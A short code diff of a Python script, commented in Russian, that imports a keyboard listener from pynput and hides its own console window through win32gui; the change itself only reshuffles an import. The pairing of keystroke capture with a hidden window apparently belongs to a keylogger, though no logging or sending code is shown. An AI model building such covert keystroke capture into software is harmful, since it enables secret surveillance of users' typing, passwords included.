@@ -1,9 +1,10 @@
 from pynput.keyboard import Listener, Key
 # импортируем нужные классы, Listener - прослушиватель нажатий, Key - удобно получает коды клавиш в ascii
+#
 
-import win32api
 import win32gui
 import win32console
+#import win32api
 
 window = win32console.GetConsoleWindow()
 win32gui.ShowWindow(window, 0)
